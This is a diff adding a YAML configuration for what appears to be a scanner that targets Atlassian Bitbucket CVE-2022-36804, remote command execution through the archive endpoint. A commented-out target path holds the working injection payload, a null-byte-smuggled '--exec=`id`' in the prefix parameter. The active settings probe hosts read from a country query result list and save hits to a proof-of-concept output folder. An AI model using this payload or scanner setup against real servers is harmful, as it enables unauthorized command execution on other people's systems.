@@ -1,0 +1,21 @@
+#targetPath: /rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60id%60%00--remote=origin
+targetPath: /rest/api/latest/repos
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+#    respBody: message
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/Atlassian_Bitbucket_archive_远程命令执行漏洞CVE_2022_36804/
+targetRestText: True
